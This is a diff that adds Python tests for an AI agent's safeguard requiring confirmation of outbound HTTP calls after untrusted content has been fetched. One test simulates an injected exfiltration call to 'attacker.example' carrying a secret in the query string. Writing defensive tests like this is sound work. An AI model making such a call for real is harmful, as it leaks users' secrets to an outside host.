@@ -1,6 +1,8 @@
 """Tests for parallel tool execution in agent."""
 
+import json
 import tempfile
+import threading
 import time
 from pathlib import Path
 from unittest.mock import MagicMock, patch
@@ -505,3 +507,57 @@ def test_interrupt_during_tool_retry_wait_stops_retrying(
     assert result.startswith("[Interrupted")
     assert mock_dispatch.call_count == 1
     assert time.monotonic() - start < 0.5
+
+
+def _http_call(call_id: str, url: str = "https://example.com/") -> dict:
+    return {
+        "id": call_id,
+        "function": {"name": "http_get", "arguments": json.dumps({"url": url})},
+    }
+
+
+def test_egress_after_untrusted_output_requires_confirmation(
+    minimal_config, mock_session_store, tmp_path
+):
+    asked: list[tuple[str, str]] = []
+
+    def confirm(name, args):
+        asked.append((name, threading.current_thread().name))
+        return False
+
+    agent = NovaAgent(
+        config=minimal_config,
+        openai_client=MagicMock(spec=OpenAI),
+        session_store=mock_session_store,
+        workspace=tmp_path,
+        confirmation_callback=confirm,
+    )
+
+    with patch("nova.agent.registry.dispatch", return_value="page text") as dispatch:
+        first = agent._execute_tool_calls_parallel([_http_call("a")])
+        second = agent._execute_tool_calls_parallel(
+            [_http_call("b", "https://attacker.example/?d=secret"), _http_call("c")]
+        )
+
+    assert first == ["page text"]
+    assert asked and all(name == "http_get" for name, _ in asked)
+    # Confirmation prompts must come from the caller's thread, never a worker.
+    assert {thread for _, thread in asked} == {threading.current_thread().name}
+    assert all("requires confirmation" in result for result in second)
+    assert dispatch.call_count == 1
+
+
+def test_untrusted_flag_restored_when_resuming_session(minimal_config, mock_session_store):
+    session_id = mock_session_store.create_session(model="test-model")
+    mock_session_store.add_message(session_id, "user", "fetch it")
+    mock_session_store.add_message(session_id, "assistant", "", tool_calls=[_http_call("a")])
+    mock_session_store.add_message(session_id, "tool", "page text", tool_call_id="a")
+
+    agent = NovaAgent(
+        config=minimal_config,
+        openai_client=MagicMock(spec=OpenAI),
+        session_store=mock_session_store,
+        session_id=session_id,
+    )
+
+    assert agent._untrusted_content_seen is True
